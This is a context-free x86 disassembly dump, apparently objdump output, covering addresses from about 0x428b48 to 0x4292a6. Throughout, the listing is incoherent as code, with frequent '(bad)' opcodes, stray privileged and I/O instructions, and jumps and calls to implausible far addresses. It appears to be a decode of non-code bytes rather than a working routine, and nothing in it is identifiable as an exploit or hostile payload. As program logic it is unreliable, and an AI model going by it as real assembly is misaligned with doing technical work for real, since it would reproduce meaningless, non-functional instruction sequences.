  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
